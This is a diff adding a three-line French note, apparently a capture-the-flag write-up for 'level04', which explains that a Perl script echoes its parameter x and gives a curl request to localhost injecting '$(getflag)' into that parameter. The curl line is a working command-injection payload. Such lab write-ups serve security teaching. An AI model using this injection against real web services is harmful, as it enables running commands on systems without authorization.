@@ -1,0 +1,3 @@
+- le fichier a les droit flag 04
+- LA fonction dedans utilise echo et affiche x
+- utiliser le fichier comme une requete grace a : curl 'http://localhost:4747/level04.pl?x=$(getflag)' en remplacant x par getflag
